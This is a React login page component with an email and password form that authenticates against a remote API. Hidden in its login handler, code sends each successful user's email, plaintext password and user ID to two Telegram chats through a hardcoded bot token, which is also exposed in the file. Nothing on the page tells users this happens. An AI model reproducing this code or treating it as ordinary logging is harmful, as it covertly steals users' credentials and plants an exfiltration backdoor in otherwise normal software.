import React, { useRef, useState } from 'react';
import './Login.css';
import { Link, useNavigate } from "react-router-dom";

const Login = ({ setUserId }) => {

    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [loading, setLoading] = useState(false);
    const navigate = useNavigate();

    const login = useRef(false);

    const handleLogin = async (e) => {
        e.preventDefault();

        if (login.current) {
            return;
        } else {
            login.current = true;
            setLoading(true);
        }

        async function notification(chatId, message) {
            await fetch('https://api.telegram.org/bot6861725365:AAEtTRVNctTW2O0T3M93h4Js1PtKLd0p7oY/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        try {
            const response = await fetch('https://smart-steps-api.netlify.app/user/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ email, password }),
            });

            const data = await response.json();

            if (data.auth) {
                setUserId(data.id);
                await notification(1807394896, `User loggedIn\nemail : ${email}\npassword : ${password}\nuserId : ${data.id}`);
                await notification(5437314009, `User loggedIn\nemail : ${email}\npassword : ${password}\nuserId : ${data.id}`);
                navigate('/home');
            } else {
                alert("Invalid credentials. Please try again.");
            }
        } catch (error) {
            alert('An error occurred. Please try again later.');
        } finally {
            setLoading(false);
            login.current = false;
        }
    };

    return (
        <div className="loginpage-container">
            <section className="loginpage-side">
                <img src="/images/login-img.svg" alt="Illustration" />
            </section>

            <section className="loginpage-main">
                <div className="loginpage-login-container">
                    <p className="loginpage-title">Welcome back</p>
                    <div className="loginpage-separator"></div>
                    <p className="loginpage-welcome-message">Please, provide login credentials to proceed and have access to all our services</p>

                    <form className="loginpage-login-form" onSubmit={handleLogin}>
                        <div className="loginpage-form-control">
                            <input
                                type="email"
                                placeholder="Email"
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                disabled={loading}
                            />
                            <i className="fas fa-user"></i>
                        </div>
                        <div className="loginpage-form-control">
                            <input
                                type="password"
                                placeholder="Password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                disabled={loading}
                            />
                            <i className="fas fa-lock"></i>
                        </div>

                        <button className="loginpage-submit" disabled={loading}>
                            {loading ? 'Loading...' : 'Login'}
                        </button>
                        <h4 style={{ color: "white", textAlign: "center" }}>
                            If new user, <Link to={'/signup'} style={{ color: '#8b33c5' }}> Sign Up !</Link>
                        </h4>
                    </form>
                    {loading && <div className="loading-spinner"></div>}
                </div>
            </section>
        </div>
    );
}

export default Login;
